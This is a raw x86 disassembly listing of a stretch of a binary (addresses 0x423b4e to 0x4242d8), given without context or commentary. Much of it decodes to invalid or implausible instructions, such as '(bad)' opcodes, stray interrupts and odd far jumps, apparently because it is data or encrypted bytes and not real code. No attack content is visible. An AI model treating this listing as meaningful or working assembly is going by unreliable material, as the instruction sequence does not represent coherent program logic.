  423b4e:	int    0x76
  423b50:	lods   eax,DWORD PTR ds:[esi]
  423b51:	or     dh,BYTE PTR [esi+0x75]
  423b54:	int    0x76
  423b56:	cmp    eax,0xecfd760a
  423b5b:	cmp    BYTE PTR [ebx],bh
  423b5d:	or     al,0x3b
  423b5f:	cdq    
  423b60:	shr    ebx,cl
  423b62:	xchg   edx,eax
  423b63:	shr    edx,cl
  423b65:	sub    BYTE PTR [ebx+0x13],dl
  423b68:	jno    0x423b37
  423b6a:	lea    esi,[ebp+0x3bb596cd]
  423b70:	or     al,0x3b
  423b72:	cdq    
  423b73:	shr    ebx,cl
  423b75:	xchg   edx,eax
  423b76:	shr    edx,cl
  423b78:	sub    BYTE PTR [ebx+0x13],dl
  423b7b:	jno    0x423b7d
  423b7d:	(bad)  
  423b7e:	lods   eax,DWORD PTR ds:[esi]
  423b7f:	add    BYTE PTR [eax+0x1c],dh
  423b82:	int    0x76
  423b84:	std    
  423b85:	or     dh,BYTE PTR [esi+0x1d]
  423b88:	int    0x76
  423b8a:	jne    0x423b96
  423b8c:	out    0x55,al
  423b8e:	or     dh,BYTE PTR [esi-0x30]
  423b91:	leave  
  423b92:	jbe    0x423b31
  423b94:	inc    ecx
  423b95:	and    DWORD PTR [esi+0x5576cd35],eax
  423b9b:	int    0x8d
  423b9d:	push   ebp
  423b9e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423ba1:	or     al,0xd3
  423ba3:	lods   eax,DWORD PTR ds:[esi]
  423ba4:	sub    bl,dl
  423ba6:	jmp    0x423b3a
  423ba8:	push   ebx
  423ba9:	ror    DWORD PTR [edx],cl
  423bab:	jbe    0x423bf2
  423bad:	int    0x76
  423baf:	push   ebp
  423bb0:	int    0x8d
  423bb2:	push   ebp
  423bb3:	cmp    edi,DWORD PTR [ecx+0x3b]
  423bb6:	or     al,0xd3
  423bb8:	lods   eax,DWORD PTR ds:[esi]
  423bb9:	sub    bl,dl
  423bbb:	jmp    0x423b4f
  423bbd:	push   ebx
  423bbe:	ror    DWORD PTR [edx],cl
  423bc0:	jbe    0x423bcf
  423bc2:	leave  
  423bc3:	jbe    0x423b5a
  423bc5:	dec    eax
  423bc6:	and    DWORD PTR [esi-0x528936cb],eax
  423bcc:	ret    0x8621
  423bcf:	xor    eax,0xcd5576cd
  423bd4:	lea    edx,[ebp+0x3b]
  423bd7:	jns    0x423c14
  423bd9:	or     al,0xd3
  423bdb:	jmp    0x423b6f
  423bdd:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423be3:	lea    ebx,ds:0x52f7d43
  423be9:	push   ss
  423bea:	xchg   DWORD PTR [eax-0x6d241480],eax
  423bf0:	add    BYTE PTR [eax-0x326a7233],0x76
  423bf7:	xchg   ebp,eax
  423bf8:	int    0x96
  423bfa:	inc    ebp
  423bfb:	cmp    eax,ebp
  423bfd:	cmp    ecx,DWORD PTR [edi]
  423bff:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423c05:	push   ebx
  423c06:	jge    0x423bd5
  423c08:	jbe    0x423c27
  423c0a:	xor    edx,edx
  423c0c:	cmp    ebx,edx
  423c0e:	clc    
  423c0f:	add    cl,BYTE PTR [edx]
  423c11:	jbe    0x423c20
  423c13:	int    0x76
  423c15:	lods   eax,DWORD PTR ds:[esi]
  423c16:	int    0x8d
  423c18:	lods   eax,DWORD PTR ds:[esi]
  423c19:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c1c:	or     al,0xd3
  423c1e:	jmp    0x423bb2
  423c20:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c26:	lea    ecx,ds:0x16d87d43
  423c2c:	int    0x76
  423c2e:	lods   eax,DWORD PTR ds:[esi]
  423c2f:	int    0x8d
  423c31:	lods   eax,DWORD PTR ds:[esi]
  423c32:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c35:	or     al,0xd3
  423c37:	lods   eax,DWORD PTR ds:[esi]
  423c38:	sub    bl,dl
  423c3a:	jmp    0x423bce
  423c3c:	push   ebx
  423c3d:	ror    DWORD PTR [edx],cl
  423c3f:	jbe    0x423c4e
  423c41:	int    0x76
  423c43:	xchg   ebp,eax
  423c44:	int    0x8d
  423c46:	xchg   ebp,eax
  423c47:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c4a:	or     al,0xd3
  423c4c:	lods   eax,DWORD PTR ds:[esi]
  423c4d:	sub    bl,dl
  423c4f:	jmp    0x423be3
  423c51:	push   ebx
  423c52:	ror    ebp,cl
  423c54:	lea    ecx,ds:0xad3d12f
  423c5a:	jbe    0x423c69
  423c5c:	int    0x76
  423c5e:	push   ebp
  423c5f:	int    0x8d
  423c61:	push   ebp
  423c62:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c65:	or     al,0xd3
  423c67:	jmp    0x423bfb
  423c69:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c6f:	lea    ecx,ds:0x52f7d43
  423c75:	pusha  
  423c76:	xchg   edx,eax
  423c77:	add    BYTE PTR [eax+0xa0d76cd],0x76
  423c7e:	or     eax,0x874576cd
  423c83:	jbe    0x423c55
  423c85:	or     ah,dh
  423c87:	cmp    eax,0x5d5d760a
  423c8c:	inc    ecx
  423c8d:	and    DWORD PTR [esi+0x6d760a35],eax
  423c93:	leave  
  423c94:	jbe    0x423cfb
  423c96:	cmp    DWORD PTR [ecx],esp
  423c98:	xchg   BYTE PTR ds:0xb22576c9,dh
  423c9e:	and    DWORD PTR [esi-0xe89f5cb],eax
  423ca4:	int    0x76
  423ca6:	cmp    eax,0x3b3d8dcd
  423cab:	jns    0x423ce8
  423cad:	or     al,0xd3
  423caf:	lods   eax,DWORD PTR ds:[esi]
  423cb0:	sub    bl,dl
  423cb2:	jmp    0x423c46
  423cb4:	push   ebx
  423cb5:	ror    DWORD PTR [edx],cl
  423cb7:	jbe    0x423d36
  423cb9:	int    0x6d
  423cbb:	jmp    0x423cc3
  423cbd:	add    DWORD PTR [eax-0x36923280],0x8c06
  423cc7:	add    BYTE PTR [ebx],cl
  423cc9:	and    DWORD PTR [esi-0x369232cb],eax
  423ccf:	push   es
  423cd0:	jl     0x423cd2
  423cd2:	add    BYTE PTR [eax],al
  423cd4:	mul    DWORD PTR [ecx]
  423cd6:	xchg   BYTE PTR ds:0x6dcd6dcd,dh
  423cdc:	int    0x76
  423cde:	icebp  
  423cdf:	int    0x8d
  423ce1:	icebp  
  423ce2:	cmp    edi,DWORD PTR [ecx+0x3b]
  423ce5:	or     al,0xd3
  423ce7:	lods   eax,DWORD PTR ds:[esi]
  423ce8:	sub    bl,dl
  423cea:	jmp    0x423c7e
  423cec:	push   ebx
  423ced:	ror    ebp,cl
  423cef:	lea    edi,[ebp+0x2f]
  423cf2:	rcl    ebx,1
  423cf4:	int    0x8d
  423cf6:	pop    ebp
  423cf7:	retf   0x8884
  423cfa:	or     DWORD PTR [esi-0x1f],esi
  423cfd:	int    0x6d
  423cff:	int    0x76
  423d01:	icebp  
  423d02:	int    0x8d
  423d04:	icebp  
  423d05:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423d08:	jns    0x423cdd
  423d0a:	jmp    0x423c9e
  423d0c:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423d12:	lea    edi,[ebp+0x2f]
  423d15:	rcl    ebx,1
  423d17:	int    0x8d
  423d19:	gs int 0x96
  423d1c:	cmp    ecx,DWORD PTR gs:[edi]
  423d1f:	cmp    edx,ebp
  423d21:	shl    edx,cl
  423d23:	sub    bl,dl
  423d25:	repz xchg edx,eax
  423d27:	push   ebx
  423d28:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423d2e:	das    
  423d2f:	pop    ecx
  423d30:	dec    esp
  423d31:	mov    ch,cl
  423d33:	push   es
  423d34:	mov    WORD PTR [eax],es
  423d36:	add    BYTE PTR [eax],al
  423d38:	int    0x17
  423d3a:	mov    WORD PTR [eax],es
  423d3c:	add    BYTE PTR [eax],al
  423d3e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d41:	aad    0xd3
  423d43:	lods   eax,DWORD PTR ds:[esi]
  423d44:	sub    bl,dl
  423d46:	repz xchg edx,eax
  423d48:	push   ebx
  423d49:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423d4f:	loope  0x423d8c
  423d51:	jge    0x423d5c
  423d53:	(bad)  
  423d54:	loope  0x423d23
  423d56:	ins    DWORD PTR es:[edi],dx
  423d57:	retf   0xe176
  423d5a:	int    0x8d
  423d5c:	icebp  
  423d5d:	int    0x96
  423d5f:	icebp  
  423d60:	cmp    ecx,DWORD PTR [edi]
  423d62:	cmp    edx,ebp
  423d64:	shl    ebx,cl
  423d66:	xchg   edx,eax
  423d67:	shl    edx,cl
  423d69:	sub    BYTE PTR [ebx+0x13],dl
  423d6c:	int    0x96
  423d6e:	jge    0x423d9f
  423d70:	rcl    DWORD PTR [ebx],1
  423d72:	int    0x96
  423d74:	pop    ebp
  423d75:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423d7c:	icebp  
  423d7d:	int    0x8d
  423d7f:	icebp  
  423d80:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d83:	or     al,0xd3
  423d85:	lods   eax,DWORD PTR ds:[esi]
  423d86:	sub    bl,dl
  423d88:	jmp    0x423d1c
  423d8a:	push   ebx
  423d8b:	ror    ebp,cl
  423d8d:	lea    edi,[ebp+0x2f]
  423d90:	rcl    ebx,1
  423d92:	int    0x8d
  423d94:	pop    ebp
  423d95:	retf   0x8884
  423d98:	or     DWORD PTR [esi-0x1f],esi
  423d9b:	int    0x6d
  423d9d:	int    0x76
  423d9f:	icebp  
  423da0:	int    0x8d
  423da2:	icebp  
  423da3:	cmp    edi,DWORD PTR [ecx-0x2d]
  423da6:	lods   eax,DWORD PTR ds:[esi]
  423da7:	sub    BYTE PTR [ebx],bh
  423da9:	or     al,0xd3
  423dab:	jmp    0x423d3f
  423dad:	push   ebx
  423dae:	ror    ebp,cl
  423db0:	lea    edi,[ebp+0x2f]
  423db3:	rcl    ebx,1
  423db5:	int    0x8d
  423db7:	ins    DWORD PTR es:[edi],dx
  423db8:	int    0x96
  423dba:	ins    DWORD PTR es:[edi],dx
  423dbb:	cmp    ecx,DWORD PTR [edi]
  423dbd:	cmp    edx,ebp
  423dbf:	shl    edx,cl
  423dc1:	sub    bl,dl
  423dc3:	repz xchg edx,eax
  423dc5:	push   ebx
  423dc6:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423dcc:	das    
  423dcd:	pop    ecx
  423dce:	dec    esp
  423dcf:	mov    ch,cl
  423dd1:	push   es
  423dd2:	jl     0x423dd4
  423dd4:	add    BYTE PTR [eax],al
  423dd6:	int    0x17
  423dd8:	jl     0x423dda
  423dda:	add    BYTE PTR [eax],al
  423ddc:	cmp    edi,DWORD PTR [ecx+0x3b]
  423ddf:	aad    0xd3
  423de1:	lods   eax,DWORD PTR ds:[esi]
  423de2:	sub    bl,dl
  423de4:	repz xchg edx,eax
  423de6:	push   ebx
  423de7:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423ded:	loope  0x423e2a
  423def:	jge    0x423dfa
  423df1:	(bad)  
  423df2:	loope  0x423dc1
  423df4:	ins    DWORD PTR es:[edi],dx
  423df5:	retf   0xe176
  423df8:	int    0x8d
  423dfa:	icebp  
  423dfb:	int    0x96
  423dfd:	icebp  
  423dfe:	cmp    ecx,DWORD PTR [edi]
  423e00:	cmp    edx,ebp
  423e02:	shl    ebx,cl
  423e04:	xchg   edx,eax
  423e05:	shl    edx,cl
  423e07:	sub    BYTE PTR [ebx+0x13],dl
  423e0a:	int    0x96
  423e0c:	jge    0x423e3d
  423e0e:	rcl    DWORD PTR [ebx],1
  423e10:	int    0x96
  423e12:	pop    ebp
  423e13:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423e1a:	and    eax,0x3b258dcd
  423e1f:	or     al,0x3b
  423e21:	jns    0x423df6
  423e23:	jmp    0x423db7
  423e25:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423e2b:	lea    ebp,[ebp-0x33]
  423e2e:	xchg   esi,eax
  423e2f:	ins    DWORD PTR es:[edi],dx
  423e30:	cmp    ecx,DWORD PTR [edi]
  423e32:	cmp    edx,ebp
  423e34:	shl    edx,cl
  423e36:	sub    bl,dl
  423e38:	repz xchg edx,eax
  423e3a:	push   ebx
  423e3b:	adc    ebp,DWORD PTR [edi]
  423e3d:	rcl    ebx,1
  423e3f:	xchg   DWORD PTR [esi+0x7d],esi
  423e42:	or     dh,BYTE PTR [esi+0x7d]
  423e45:	int    0x76
  423e47:	jge    0x423e16
  423e49:	lea    ecx,ds:0xb2f7d43
  423e4f:	(bad)  
  423e50:	inc    DWORD PTR [eax]
  423e52:	add    ch,cl
  423e54:	jbe    0x423ec3
  423e56:	int    0x8d
  423e58:	ins    DWORD PTR es:[edi],dx
  423e59:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e5c:	jmp    0x423df0
  423e5e:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e61:	lods   eax,DWORD PTR ds:[esi]
  423e62:	sub    BYTE PTR [ebx-0x2d],dl
  423e65:	int    0x8d
  423e67:	or     eax,0xcdd3d12f
  423e6c:	lea    edi,ds:0xf2d30f3b
  423e72:	sub    BYTE PTR [ebx-0x2d],dl
  423e75:	int    0x8d
  423e77:	cmp    eax,0xebd30c3b
  423e7c:	xchg   edx,eax
  423e7d:	push   ebx
  423e7e:	ror    DWORD PTR [edx],cl
  423e80:	jbe    0x423ee7
  423e82:	int    0x76
  423e84:	popf   
  423e85:	int    0x8d
  423e87:	popf   
  423e88:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e8b:	jmp    0x423e1f
  423e8d:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e90:	lods   eax,DWORD PTR ds:[esi]
  423e91:	sub    BYTE PTR [ebx-0x2d],dl
  423e94:	int    0x8d
  423e96:	popf   
  423e97:	int    0x96
  423e99:	popf   
  423e9a:	cmp    ecx,DWORD PTR [edi]
  423e9c:	shl    edx,cl
  423e9e:	sub    BYTE PTR [ebx],bh
  423ea0:	aad    0xd3
  423ea2:	repz xchg edx,eax
  423ea4:	push   ebx
  423ea5:	adc    eax,DWORD PTR [edi+0x7d87658d]
  423eab:	xchg   DWORD PTR [ebp+0x458d0a45],ecx
  423eb1:	in     al,dx
  423eb2:	sbb    al,0xcd
  423eb4:	jbe    0x423e53
  423eb6:	int    0x8d
  423eb8:	popf   
  423eb9:	cmp    edi,DWORD PTR [ecx+0x3b]
  423ebc:	or     al,0xd3
  423ebe:	lods   eax,DWORD PTR ds:[esi]
  423ebf:	sub    bl,dl
  423ec1:	jmp    0x423e55
  423ec3:	push   ebx
  423ec4:	rol    DWORD PTR [edi+0x760a4576],cl
  423eca:	inc    ebp
  423ecb:	int    0x76
  423ecd:	popf   
  423ece:	int    0x8d
  423ed0:	popf   
  423ed1:	cmp    edi,DWORD PTR [ecx-0x2d]
  423ed4:	lods   eax,DWORD PTR ds:[esi]
  423ed5:	sub    BYTE PTR [ebx],bh
  423ed7:	or     al,0xd3
  423ed9:	jmp    0x423e6d
  423edb:	push   ebx
  423edc:	ror    ebp,cl
  423ede:	lea    ebx,ds:0x76cd7d33
  423ee4:	popf   
  423ee5:	int    0x96
  423ee7:	popf   
  423ee8:	cmp    edi,DWORD PTR [ecx+0x3b]
  423eeb:	aad    0xd3
  423eed:	repz xchg edx,eax
  423eef:	shr    DWORD PTR [ebp-0x322dacd8],cl
  423ef5:	xchg   esi,eax
  423ef6:	inc    ebp
  423ef7:	das    
  423ef8:	rcl    edx,1
  423efa:	inc    ebx
  423efb:	shr    DWORD PTR [edi],cl
  423efd:	pop    es
  423efe:	adc    ebp,edi
  423f00:	add    BYTE PTR [eax],al
  423f02:	int    0x76
  423f04:	mov    BYTE PTR [eax],al
  423f06:	(bad)  
  423f07:	dec    esp
  423f08:	iret   
  423f09:	jbe    0x423ec8
  423f0b:	add    dh,dl
  423f0d:	mov    BYTE PTR [eax-0x33],dh
  423f10:	jbe    0x423e9a
  423f12:	int    0x1
  423f14:	xchg   ebp,eax
  423f15:	add    DWORD PTR [eax-0x32afff80],0x1cd8876
  423f1f:	icebp  
  423f20:	add    DWORD PTR [eax+0x500080],0xd600fdd6
  423f2a:	jne    0x423ee9
  423f2c:	test   al,0x88
  423f2e:	add    BYTE PTR [eax-0x322f89f6],0x76
  423f35:	stc    
  423f36:	int    0x8d
  423f38:	stc    
  423f39:	cmp    eax,ebp
  423f3b:	cmp    ecx,DWORD PTR [edi]
  423f3d:	shl    edx,cl
  423f3f:	sub    bl,dl
  423f41:	mov    ebp,0xcdd35392
  423f46:	lea    esi,[ebp+0x43]
  423f49:	rcl    esp,cl
  423f4b:	push   esi
  423f4c:	int    0x76
  423f4e:	mov    ch,cl
  423f50:	lea    ebp,ds:0xcd2d96cd
  423f56:	add    DWORD PTR [ecx],edx
  423f58:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423f62:	shr    edx,cl
  423f64:	sub    BYTE PTR [ebx+0x13],dl
  423f67:	jno    0x423f36
  423f69:	(bad)  
  423f6a:	stc    
  423f6b:	int    0x96
  423f6d:	stc    
  423f6e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423f71:	cdq    
  423f72:	shr    ebx,cl
  423f74:	xchg   edx,eax
  423f75:	shr    edx,cl
  423f77:	sub    BYTE PTR [ebx+0x13],dl
  423f7a:	jno    0x423f7c
  423f7c:	(bad)  
  423f7d:	jne    0x423f7f
  423f7f:	jo     0x423f9d
  423f81:	stos   BYTE PTR es:[edi],al
  423f82:	test   al,0x63
  423f84:	retf   
  423f85:	ror    BYTE PTR [eax-0x12326980],cl
  423f8b:	add    al,0xed
  423f8d:	and    al,0x98
  423f8f:	int    0x11
  423f91:	int    0x12
  423f93:	sub    eax,0x4808081
  423f98:	pop    esp
  423f99:	sub    BYTE PTR [edi],0x5
  423f9c:	dec    edx
  423f9d:	add    DWORD PTR [eax+0x2fda0680],0x80819205
  423fa7:	add    BYTE PTR [esi],0xf7
  423faa:	das    
  423fab:	add    eax,0x80808003
  423fb0:	int    0x7
  423fb2:	or     DWORD PTR [eax+0x6d068080],eax
  423fb8:	das    
  423fb9:	add    eax,0x808080e9
  423fbe:	add    al,0x69
  423fc0:	int3   
  423fc1:	add    BYTE PTR [eax+0x52f3080],0xe2
  423fc8:	add    BYTE PTR [eax+0x54985e80],0x2f
  423fcf:	add    eax,0x808080e3
  423fd4:	int    0xc1
  423fd6:	and    eax,0x4808081
  423fdb:	mov    dh,0x11
  423fdd:	or     ch,0x13
  423fe0:	xor    ecx,DWORD PTR [esi-0x79]
  423fe3:	shr    BYTE PTR [edi],cl
  423fe5:	mov    ebx,0x8d0a4c70
  423fea:	mov    ch,0x2f
  423fec:	mov    ebx,0x13874e7c
  423ff1:	das    
  423ff2:	add    eax,0x80808049
  423ff7:	iret   
  423ff8:	jl     0x42400e
  423ffa:	pop    ebx
  423ffb:	or     cl,BYTE PTR [ebp+0x69bd]
  424001:	add    BYTE PTR [ebx-0x2baef966],al
  424007:	or     ebp,0x31
  42400a:	add    al,0xb6
  42400c:	cmc    
  42400d:	sub    BYTE PTR [ebx],0x99
  424010:	xchg   ecx,esi
  424012:	das    
  424013:	mov    ebx,0xbb2f4ee0
  424018:	mov    al,ds:0xd4fc874c
  42401d:	mov    esi,0xa148acf
  424022:	(bad)  
  424023:	in     eax,dx
  424024:	push   es
  424025:	push   ecx
  424026:	aam    0x6e
  424028:	int    0x89
  42402a:	add    al,0xb6
  42402c:	stc    
  42402d:	sub    BYTE PTR [ebx],0xf
  424030:	xchg   DWORD PTR [ebp+0x2f],edi
  424033:	mov    ebx,0xbb2f4ede
  424038:	sahf   
  424039:	dec    esp
  42403a:	xchg   esp,edi
  42403c:	aam    0x33
  42403e:	iret   
  42403f:	ficom  WORD PTR [edx+ecx*1]
  424042:	out    0xfd,al
  424044:	int    0xe6
  424046:	std    
  424047:	int    0x6a
  424049:	push   es
  42404a:	add    ah,dl
  42404c:	xchg   ch,cl
  42404e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42404f:	mov    ch,0x81
  424051:	and    al,0x8b
  424053:	das    
  424054:	mov    ebx,0xbb2f4ede
  424059:	sahf   
  42405a:	dec    esp
  42405b:	add    BYTE PTR [esi-0x7],dh
  42405e:	add    al,0x76
  424060:	std    
  424061:	mov    BYTE PTR [edi-0x619a104],al
  424067:	sbb    ch,0x2f
  42406a:	mov    ebx,0xbb2f4ee0
  42406f:	mov    al,ds:0xed8dcd4c
  424074:	add    BYTE PTR [esi-0xb],dh
  424077:	add    al,0xd3
  424079:	mov    BYTE PTR [edi-0x1272f504],al
  42407f:	pop    esi
  424080:	out    0xf5,al
  424082:	sub    BYTE PTR ds:0x2fbd8dcd,0xbb
  424089:	jo     0x4240d9
  42408b:	das    
  42408c:	mov    ebx,0x76004cdc
  424091:	adc    DWORD PTR [ebx+edx*8],eax
  424094:	mov    BYTE PTR [edi-0x4272f527],al
  42409a:	pop    esi
  42409b:	xchg   esi,eax
  42409c:	adc    DWORD PTR [edi],ebp
  42409e:	or     ebp,DWORD PTR [esi-0x56000000]
  4240a4:	arpl   WORD PTR [ebx],di
  4240a6:	ins    DWORD PTR es:[edi],dx
  4240a7:	ins    BYTE PTR es:[edi],dx
  4240a8:	in     al,dx
  4240a9:	xchg   edx,eax
  4240aa:	cmp    ebp,DWORD PTR [ebp-0x58]
  4240ad:	retf   
  4240ae:	lds    edx,FWORD PTR [esi+0xacdedcd]
  4240b4:	sub    eax,0xcd808081
  4240b9:	jbe    0x424107
  4240bb:	add    al,0xed
  4240bd:	xor    BYTE PTR [ebx+0x3b],bl
  4240c0:	fstp   QWORD PTR [eax+0x2f1e5e9a]
  4240c6:	add    eax,0x8080800b
  4240cb:	inc    ebx
  4240cc:	(bad)
  4240cf:	pop    esi
  4240d0:	pushf  
  4240d1:	(bad)  
  4240d3:	test   DWORD PTR [ebx],edi
  4240d5:	ins    DWORD PTR es:[edi],dx
  4240d6:	ins    BYTE PTR es:[edi],dx
  4240d7:	in     al,dx
  4240d8:	fmul   st,st(5)
  4240da:	ins    BYTE PTR es:[edi],dx
  4240db:	fadd   QWORD PTR [edi+0x7ccd8876]
  4240e1:	and    al,0xcd
  4240e3:	jo     0x424119
  4240e5:	int    0x90
  4240e7:	adc    al,0xcd
  4240e9:	fcomp  QWORD PTR [edi+eax*4]
  4240ec:	lea    ecx,[eax+0xa889687]
  4240f2:	(bad)  
  4240f3:	std    
  4240f4:	inc    ebx
  4240f5:	clc    
  4240f6:	jnp    0x42407f
  4240f8:	or     ah,dh
  4240fa:	std    
  4240fb:	or     ah,BYTE PTR [esi-0x259a107]
  424101:	fsub   st,st(3)
  424103:	inc    ebx
  424104:	pushf  
  424105:	adc    al,0x77
  424107:	xchg   BYTE PTR [edi],ch
  424109:	mov    ebx,0x92eca054
  42410e:	int    0xf4
  424110:	iret   
  424111:	push   esp
  424112:	ror    ebp,0x68
  424115:	push   es
  424116:	add    ah,dl
  424118:	ds xchg esi,esp
  42411b:	mov    BYTE PTR [edx],cl
  42411d:	out    0x11,al
  42411f:	inc    ebx
  424120:	stc    
  424121:	fdiv   DWORD PTR [eax]
  424123:	int    0xa6
  424125:	dec    esp
  424126:	int    0x63
  424128:	in     al,0x87
  42412a:	popf   
  42412b:	inc    ebx
  42412c:	cld    
  42412d:	ja     0x4240b3
  42412f:	int    0x58
  424131:	in     al,dx
  424132:	mov    BYTE PTR [ebx],dh
  424134:	out    0x88,al
  424136:	or     ch,BYTE PTR [eax-0x33]
  424139:	(bad)  
  42413a:	adc    DWORD PTR [esi],eax
  42413c:	not    esp
  42413e:	dec    esi
  42413f:	int    0xa6
  424141:	stc    
  424142:	dec    ebx
  424143:	or     ah,BYTE PTR [esi-0x259bc07]
  424149:	sbb    BYTE PTR [ebp-0x14],0x8
  42414d:	cmp    ebp,DWORD PTR [ebp-0x56]
  424150:	test   al,0x63
  424152:	retf   
  424153:	ror    BYTE PTR [eax-0x12326980],cl
  424159:	add    al,0xed
  42415b:	push   eax
  42415c:	pop    ebx
  42415d:	cwde   
  42415e:	pop    ebp
  42415f:	dec    ecx
  424160:	and    DWORD PTR [esi-0x289f5cb],eax
  424166:	leave  
  424167:	jbe    0x424162
  424169:	inc    ecx
  42416a:	and    DWORD PTR [esi-0x27232cb],eax
  424170:	int    0xa6
  424172:	std    
  424173:	call   0x3b81:0x90cfffc0
  42417a:	psrlq  mm5,mm3
  42417d:	xchg   edx,eax
  42417e:	stos   BYTE PTR es:[edi],al
  42417f:	cmp    esp,ecx
  424181:	shl    ebp,cl
  424183:	sub    BYTE PTR [ebx+0xc],dl
  424186:	or     cl,BYTE PTR [ebp-0x2723243]
  42418c:	int    0x8d
  42418e:	std    
  42418f:	int    0x8d
  424191:	std    
  424192:	int    0x8d
  424194:	std    
  424195:	int    0x8d
  424197:	std    
  424198:	int    0x8d
  42419a:	std    
  42419b:	int    0x8d
  42419d:	std    
  42419e:	int    0x8d
  4241a0:	std    
  4241a1:	int    0x8d
  4241a3:	std    
  4241a4:	int    0x8d
  4241a6:	std    
  4241a7:	leave  
  4241a8:	jbe    0x4241bb
  4241aa:	fadd   st,st(5)
  4241ac:	loope  0x424203
  4241ae:	int    0x8d
  4241b0:	std    
  4241b1:	int    0xa6
  4241b3:	std    
  4241b4:	cmp    esp,ecx
  4241b6:	cmp    ecx,DWORD PTR [edi]
  4241b8:	shl    ebp,cl
  4241ba:	sub    bl,dl
  4241bc:	jmp    0x424150
  4241be:	push   ebx
  4241bf:	or     al,0xcd
  4241c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241c2:	dec    esp
  4241c3:	int    0x9f
  4241c5:	sub    eax,0x43808081
  4241ca:	push   ebx
  4241cb:	das    
  4241cc:	add    eax,0x80808717
  4241d1:	int    0x8d
  4241d3:	std    
  4241d4:	int    0xa6
  4241d6:	std    
  4241d7:	cmp    ecx,DWORD PTR [edi]
  4241d9:	cmp    esp,ecx
  4241db:	shr    ebx,cl
  4241dd:	xchg   edx,eax
  4241de:	shl    ebp,cl
  4241e0:	sub    BYTE PTR [ebx+0xc],dl
  4241e3:	inc    ebx
  4241e4:	adc    ebp,DWORD PTR [edi]
  4241e6:	add    eax,0x8080877f
  4241eb:	int    0xca
  4241ed:	add    DWORD PTR [eax-0x69327f80],eax
  4241f3:	std    
  4241f4:	int    0xa6
  4241f6:	std    
  4241f7:	cmp    ebx,DWORD PTR [ecx-0xc2c1ec5]
  4241fd:	xchg   edx,eax
  4241fe:	shl    ebp,cl
  424200:	sub    BYTE PTR [ebx-0x2b],dl
  424203:	inc    ebx
  424204:	adc    ebp,DWORD PTR [edi]
  424206:	add    eax,0x8080875b
  42420b:	xchg   DWORD PTR [ebp-0xe72f578],ecx
  424211:	int    0xf1
  424213:	cmp    ebx,DWORD PTR [ecx-0x1ec46233]
  424219:	shl    ebx,cl
  42421b:	xchg   edx,eax
  42421c:	shl    ebp,cl
  42421e:	sub    BYTE PTR [ebx-0x2b],dl
  424221:	or     dl,BYTE PTR [esi+0x1196cd11]
  424227:	inc    ebx
  424228:	icebp  
  424229:	aam    0x26
  42422b:	int    0x76
  42422d:	std    
  42422e:	int    0x96
  424230:	std    
  424231:	cmp    ebx,ecx
  424233:	cmp    edi,DWORD PTR [ecx-0x2d]
  424236:	jmp    0xd253:0x92bdd328
  42423d:	int    0x96
  42423f:	adc    DWORD PTR [ebx-0x26],esi
  424242:	adc    al,0x5e
  424244:	test   BYTE PTR [edx-0x2a],cl
  424247:	xor    cl,ch
  424249:	jbe    0x424248
  42424b:	int    0x96
  42424d:	std    
  42424e:	cmp    ebx,ecx
  424250:	cmp    edi,DWORD PTR [ecx-0x2d]
  424253:	jmp    0xd253:0x92bdd328
  42425a:	int    0x96
  42425c:	adc    DWORD PTR [ebx-0x26],esi
  42425f:	adc    al,0x5e
  424261:	je     0x4242ad
  424263:	xor    BYTE PTR [edi],ch
  424265:	add    eax,0x808092df
  42426a:	int    0x76
  42426c:	std    
  42426d:	int    0x76
  42426f:	std    
  424270:	int    0xa6
  424272:	std    
  424273:	int    0x76
  424275:	std    
  424276:	cmp    ecx,ecx
  424278:	cmp    ebp,DWORD PTR [ecx-0x2cd7522d]
  42427e:	in     al,dx
  42427f:	xchg   edx,eax
  424280:	push   ebx
  424281:	popf   
  424282:	int    0x76
  424284:	adc    DWORD PTR [ebx+0x6d],esi
  424287:	adc    al,0x87
  424289:	ror    ebp,cl
  42428b:	jl     0x4242bd
  42428d:	xchg   DWORD PTR [ebp-0x5272f578],ecx
  424293:	int    0x8d
  424295:	std    
  424296:	int    0x96
  424298:	std    
  424299:	cmp    ecx,DWORD PTR [edi]
  42429b:	cmp    ebx,ecx
  42429d:	shr    ebx,cl
  42429f:	xchg   edx,eax
  4242a0:	shr    edx,cl
  4242a2:	sub    BYTE PTR [ebx+0x13],dl
  4242a5:	int    0x96
  4242a7:	std    
  4242a8:	or     cl,BYTE PTR [ebp+0xa88cd95]
  4242ae:	lea    esi,[ebp+0x3bfd8dcd]
  4242b4:	cdq    
  4242b5:	cmp    esi,eax
  4242b7:	shl    edx,cl
  4242b9:	sub    bl,dl
  4242bb:	repz xchg edx,eax
  4242bd:	push   ebx
  4242be:	jecxz  0x42428d
  4242c0:	lea    esi,[ebp-0x792becbd]
  4242c6:	xchg   DWORD PTR [ebp-0x6a72f578],ecx
  4242cc:	int    0x8d
  4242ce:	std    
  4242cf:	int    0x96
  4242d1:	std    
  4242d2:	cmp    ecx,DWORD PTR [edi]
  4242d4:	cmp    ebx,ecx
  4242d6:	shr    ebx,cl
  4242d8:	xchg   edx,eax
